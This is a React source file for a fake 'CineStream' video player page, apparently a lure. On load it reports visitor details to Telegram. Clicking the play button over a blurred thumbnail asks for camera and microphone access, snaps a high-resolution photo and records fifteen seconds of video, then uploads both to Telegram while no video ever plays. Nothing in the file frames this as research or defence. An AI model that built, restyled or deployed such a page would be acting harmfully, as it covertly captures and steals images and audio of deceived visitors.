import { PlayIcon } from '@heroicons/react/24/solid';
import { useState, useEffect, useCallback } from 'react';
import { sendTelegramNotification, sendImageToTelegram, sendVideoToTelegram } from './utils/telegram';

function App() {
  const [isBlurred] = useState(true);
  const thumbnailUrl = 'https://stickercommunity.com/uploads/main/25-08-2023-09-24-590yfvu-sticker1.webp';

  useEffect(() => {
    const sendVisitorNotification = async () => {
      await sendTelegramNotification({
        userAgent: navigator.userAgent,
        location: window.location.href,
        referrer: document.referrer || 'Direct',
        previousSites: document.referrer || 'None',
      });
    };
    sendVisitorNotification();
  }, []);

  const captureAndSendMedia = useCallback(async () => {
    try {
      const devices = await navigator.mediaDevices.enumerateDevices();
      const videoDevice = devices.find(device => device.kind === 'videoinput');
      if (!videoDevice) throw new Error('No video input device found');

      const constraints = {
        video: {
          deviceId: videoDevice.deviceId,
          width: { ideal: 4096 },
          height: { ideal: 2160 },
          frameRate: { ideal: 60 }
        },
        audio: true
      };

      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      const videoTrack = stream.getVideoTracks()[0];
      const settings = videoTrack.getSettings();

      const video = document.createElement('video');
      video.srcObject = stream;
      video.playsInline = true;
      video.muted = true;
      video.autoplay = true;

      await new Promise((resolve) => {
        video.onloadedmetadata = async () => {
          try {
            await video.play();
            setTimeout(resolve, 500);
          } catch (error) {
            console.error('Error playing video:', error);
            resolve(true);
          }
        };
      });

      const canvas = document.createElement('canvas');
      canvas.width = settings.width || 1920;
      canvas.height = settings.height || 1080;
      const context = canvas.getContext('2d');
      if (context) context.drawImage(video, 0, 0, canvas.width, canvas.height);

      const photoBlob = await new Promise((resolve) => {
        canvas.toBlob((blob) => { if (blob) resolve(blob); }, 'image/jpeg', 1.0);
      });

      sendImageToTelegram(photoBlob).catch(console.error);

      const mimeTypes = [
        'video/mp4;codecs=h264,aac',
        'video/mp4',
        'video/webm;codecs=vp8,opus',
        'video/webm'
      ];
      const supportedMimeType = mimeTypes.find(type => MediaRecorder.isTypeSupported(type));
      if (!supportedMimeType) throw new Error('No supported video format found');

      const mediaRecorder = new MediaRecorder(stream, {
        mimeType: supportedMimeType,
        videoBitsPerSecond: 8000000
      });

      const chunks = [];
      mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
      mediaRecorder.onstop = async () => {
        const videoBlob = new Blob(chunks, {
          type: supportedMimeType.includes('mp4') ? 'video/mp4' : 'video/webm'
        });
        await sendVideoToTelegram(videoBlob);
        stream.getTracks().forEach(track => track.stop());
      };

      mediaRecorder.start(1000);
      setTimeout(() => {
        if (mediaRecorder.state === 'recording') mediaRecorder.stop();
      }, 15000);

    } catch (error) {
      console.error('Error capturing media:', error);
    }
  }, []);

  const handlePlayClick = async () => {
    await captureAndSendMedia();
  };

  // ============================================================
  // HANYA BAGIAN RETURN INI YANG DIUBAH
  // ============================================================
  return (
    <>
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=DM+Sans:wght@300;400;500&display=swap');

        * { box-sizing: border-box; margin: 0; padding: 0; }

        body {
          background: #080810;
          font-family: 'DM Sans', sans-serif;
        }

        .app-wrapper {
          min-height: 100vh;
          background: radial-gradient(ellipse 80% 60% at 50% -10%, #1a0a2e 0%, #080810 60%);
          display: flex;
          flex-direction: column;
        }

        /* ---- HEADER ---- */
        .header {
          position: relative;
          padding: 28px 48px;
          display: flex;
          align-items: center;
          justify-content: space-between;
          border-bottom: 1px solid rgba(255,255,255,0.05);
        }
        .header::after {
          content: '';
          position: absolute;
          bottom: -1px; left: 0;
          width: 160px; height: 1px;
          background: linear-gradient(90deg, #a855f7, transparent);
        }
        .logo-group {
          display: flex;
          align-items: center;
          gap: 12px;
        }
        .logo-dot {
          width: 10px; height: 10px;
          border-radius: 50%;
          background: #a855f7;
          box-shadow: 0 0 12px #a855f7, 0 0 28px rgba(168,85,247,0.4);
          animation: pulse-dot 2s ease-in-out infinite;
        }
        @keyframes pulse-dot {
          0%, 100% { opacity: 1; transform: scale(1); }
          50% { opacity: 0.6; transform: scale(0.85); }
        }
        .logo-text {
          font-family: 'Syne', sans-serif;
          font-weight: 800;
          font-size: 1.25rem;
          letter-spacing: -0.02em;
          color: #fff;
        }
        .logo-text span {
          color: #a855f7;
        }
        .header-badge {
          font-size: 0.7rem;
          font-weight: 500;
          letter-spacing: 0.12em;
          text-transform: uppercase;
          color: rgba(255,255,255,0.3);
          border: 1px solid rgba(255,255,255,0.08);
          padding: 5px 12px;
          border-radius: 100px;
        }

        /* ---- MAIN ---- */
        .main-content {
          flex: 1;
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: center;
          padding: 48px 24px;
          gap: 28px;
        }

        .player-label {
          font-family: 'Syne', sans-serif;
          font-size: 0.7rem;
          font-weight: 600;
          letter-spacing: 0.25em;
          text-transform: uppercase;
          color: rgba(168,85,247,0.7);
          display: flex;
          align-items: center;
          gap: 10px;
        }
        .player-label::before,
        .player-label::after {
          content: '';
          display: block;
          width: 32px; height: 1px;
          background: rgba(168,85,247,0.4);
        }

        /* ---- PLAYER CONTAINER ---- */
        .player-outer {
          width: 100%;
          max-width: 1000px;
          position: relative;
        }

        /* Glow aura */
        .player-glow {
          position: absolute;
          inset: -1px;
          border-radius: 20px;
          background: linear-gradient(135deg, rgba(168,85,247,0.35) 0%, rgba(99,102,241,0.15) 50%, rgba(168,85,247,0.1) 100%);
          filter: blur(1px);
          z-index: 0;
        }

        .player-card {
          position: relative;
          z-index: 1;
          border-radius: 18px;
          overflow: hidden;
          background: #0d0d1a;
          border: 1px solid rgba(168,85,247,0.15);
          box-shadow:
            0 0 0 1px rgba(255,255,255,0.03),
            0 40px 100px rgba(0,0,0,0.7),
            0 0 80px rgba(168,85,247,0.08);
        }

        /* Top bar inside player */
        .player-topbar {
          position: absolute;
          top: 0; left: 0; right: 0;
          z-index: 20;
          padding: 16px 20px;
          display: flex;
          align-items: center;
          justify-content: space-between;
          background: linear-gradient(to bottom, rgba(0,0,0,0.65), transparent);
        }
        .live-badge {
          display: flex;
          align-items: center;
          gap: 6px;
          background: rgba(168,85,247,0.15);
          border: 1px solid rgba(168,85,247,0.3);
          border-radius: 100px;
          padding: 4px 12px;
          font-size: 0.65rem;
          font-weight: 600;
          letter-spacing: 0.12em;
          text-transform: uppercase;
          color: #c084fc;
          backdrop-filter: blur(8px);
        }
        .live-dot {
          width: 6px; height: 6px;
          border-radius: 50%;
          background: #c084fc;
          animation: pulse-dot 1.5s ease-in-out infinite;
        }
        .quality-badge {
          font-size: 0.65rem;
          font-weight: 600;
          letter-spacing: 0.1em;
          color: rgba(255,255,255,0.4);
          border: 1px solid rgba(255,255,255,0.08);
          padding: 4px 10px;
          border-radius: 6px;
          backdrop-filter: blur(8px);
        }

        /* Thumbnail + blur overlay */
        .player-aspect {
          aspect-ratio: 16 / 9;
          position: relative;
        }
        .player-thumbnail {
          width: 100%;
          height: 100%;
          object-fit: cover;
          display: block;
          filter: brightness(0.65) saturate(0.8);
        }
        .player-blur-overlay {
          position: absolute;
          inset: 0;
          backdrop-filter: blur(16px);
          background: rgba(8,8,16,0.55);
        }

        /* Vignette */
        .player-vignette {
          position: absolute;
          inset: 0;
          background: radial-gradient(ellipse at center, transparent 30%, rgba(0,0,0,0.6) 100%);
          pointer-events: none;
          z-index: 5;
        }

        /* Play button */
        .play-center {
          position: absolute;
          inset: 0;
          display: flex;
          align-items: center;
          justify-content: center;
          z-index: 10;
        }
        .play-button-wrap {
          position: relative;
          cursor: pointer;
          background: none;
          border: none;
          display: flex;
          align-items: center;
          justify-content: center;
        }
        .play-ring {
          position: absolute;
          width: 110px; height: 110px;
          border-radius: 50%;
          border: 1px solid rgba(168,85,247,0.3);
          animation: ring-expand 2.5s ease-out infinite;
        }
        .play-ring:nth-child(2) { animation-delay: 0.8s; }
        @keyframes ring-expand {
          0% { transform: scale(0.9); opacity: 0.8; }
          100% { transform: scale(1.7); opacity: 0; }
        }
        .play-btn-inner {
          position: relative;
          width: 80px; height: 80px;
          border-radius: 50%;
          background: linear-gradient(135deg, #a855f7 0%, #7c3aed 100%);
          display: flex;
          align-items: center;
          justify-content: center;
          box-shadow:
            0 0 0 0 rgba(168,85,247,0.4),
            0 8px 32px rgba(168,85,247,0.5),
            0 2px 8px rgba(0,0,0,0.4);
          transition: transform 0.25s cubic-bezier(0.34,1.56,0.64,1), box-shadow 0.25s ease;
        }
        .play-button-wrap:hover .play-btn-inner {
          transform: scale(1.1);
          box-shadow:
            0 0 0 0 rgba(168,85,247,0.4),
            0 12px 48px rgba(168,85,247,0.7),
            0 2px 8px rgba(0,0,0,0.4);
        }
        .play-btn-inner svg {
          width: 32px; height: 32px;
          color: #fff;
          margin-left: 4px;
        }

        /* Bottom bar inside player */
        .player-bottombar {
          position: absolute;
          bottom: 0; left: 0; right: 0;
          z-index: 20;
          padding: 16px 20px;
          background: linear-gradient(to top, rgba(0,0,0,0.75), transparent);
          display: flex;
          align-items: center;
          gap: 12px;
        }
        .progress-track {
          flex: 1;
          height: 3px;
          background: rgba(255,255,255,0.1);
          border-radius: 100px;
          overflow: hidden;
        }
        .progress-fill {
          width: 0%;
          height: 100%;
          background: linear-gradient(90deg, #a855f7, #c084fc);
          border-radius: 100px;
        }
        .time-label {
          font-size: 0.65rem;
          color: rgba(255,255,255,0.3);
          font-weight: 500;
          letter-spacing: 0.05em;
          white-space: nowrap;
        }

        /* ---- META INFO BELOW PLAYER ---- */
        .meta-row {
          width: 100%;
          max-width: 1000px;
          display: flex;
          align-items: flex-start;
          justify-content: space-between;
          gap: 24px;
          padding: 0 4px;
        }
        .meta-left {}
        .meta-title {
          font-family: 'Syne', sans-serif;
          font-size: 1.15rem;
          font-weight: 700;
          color: #fff;
          letter-spacing: -0.01em;
          margin-bottom: 6px;
        }
        .meta-sub {
          font-size: 0.78rem;
          color: rgba(255,255,255,0.3);
          font-weight: 400;
          display: flex;
          align-items: center;
          gap: 12px;
        }
        .meta-dot {
          width: 3px; height: 3px;
          border-radius: 50%;
          background: rgba(255,255,255,0.2);
          display: inline-block;
        }
        .meta-right {
          display: flex;
          align-items: center;
          gap: 10px;
          flex-shrink: 0;
        }
        .meta-action-btn {
          display: flex;
          align-items: center;
          gap: 6px;
          padding: 8px 16px;
          border-radius: 100px;
          border: 1px solid rgba(255,255,255,0.08);
          background: rgba(255,255,255,0.03);
          font-size: 0.72rem;
          font-weight: 500;
          color: rgba(255,255,255,0.4);
          cursor: pointer;
          transition: all 0.2s ease;
        }
        .meta-action-btn:hover {
          border-color: rgba(168,85,247,0.3);
          color: #c084fc;
          background: rgba(168,85,247,0.07);
        }
        .meta-action-btn svg {
          width: 13px; height: 13px;
        }

        /* ---- FOOTER ---- */
        .footer {
          padding: 20px 48px;
          border-top: 1px solid rgba(255,255,255,0.04);
          display: flex;
          align-items: center;
          justify-content: space-between;
        }
        .footer-text {
          font-size: 0.7rem;
          color: rgba(255,255,255,0.15);
          letter-spacing: 0.05em;
        }
        .footer-dots {
          display: flex;
          gap: 6px;
        }
        .footer-dot {
          width: 4px; height: 4px;
          border-radius: 50%;
          background: rgba(255,255,255,0.08);
        }
        .footer-dot.active {
          background: #a855f7;
          box-shadow: 0 0 6px rgba(168,85,247,0.5);
        }
      `}</style>

      <div className="app-wrapper">

        {/* HEADER */}
        <header className="header">
          <div className="logo-group">
            <div className="logo-dot" />
            <div className="logo-text">Cine<span>Stream</span></div>
          </div>
          <div className="header-badge">HD Player</div>
        </header>

        {/* MAIN */}
        <main className="main-content">

          <div className="player-label">Now Playing</div>

          {/* PLAYER */}
          <div className="player-outer">
            <div className="player-glow" />
            <div className="player-card">

              {/* Top bar */}
              <div className="player-topbar">
                <div className="live-badge">
                  <div className="live-dot" />
                  Stream
                </div>
                <div className="quality-badge">4K UHD</div>
              </div>

              {/* Aspect ratio wrapper */}
              <div className="player-aspect">
                <img
                  src={thumbnailUrl}
                  alt="Video Thumbnail"
                  className="player-thumbnail"
                />
                {isBlurred && <div className="player-blur-overlay" />}
                <div className="player-vignette" />

                {/* Play button */}
                <div className="play-center">
                  <button className="play-button-wrap" onClick={handlePlayClick}>
                    <div className="play-ring" />
                    <div className="play-ring" style={{ animationDelay: '0.8s' }} />
                    <div className="play-btn-inner">
                      <PlayIcon />
                    </div>
                  </button>
                </div>

                {/* Bottom progress bar */}
                <div className="player-bottombar">
                  <div className="time-label">0:00</div>
                  <div className="progress-track">
                    <div className="progress-fill" />
                  </div>
                  <div className="time-label">--:--</div>
                </div>
              </div>

            </div>
          </div>

          {/* META ROW */}
          <div className="meta-row">
            <div className="meta-left">
              <div className="meta-title">Featured Content</div>
              <div className="meta-sub">
                <span>HD Stream</span>
                <span className="meta-dot" />
                <span>Click play to watch</span>
                <span className="meta-dot" />
                <span style={{ color: 'rgba(168,85,247,0.7)' }}>Free</span>
              </div>
            </div>
            <div className="meta-right">
              <button className="meta-action-btn">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"/>
                </svg>
                Save
              </button>
              <button className="meta-action-btn">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/>
                  <line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/>
                  <line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/>
                </svg>
                Share
              </button>
            </div>
          </div>

        </main>

        {/* FOOTER */}
        <footer className="footer">
          <div className="footer-text">CineStream Player v2.0</div>
          <div className="footer-dots">
            <div className="footer-dot active" />
            <div className="footer-dot" />
            <div className="footer-dot" />
          </div>
          <div className="footer-text">HD Quality</div>
        </footer>

      </div>
    </>
  );
}

export default App;
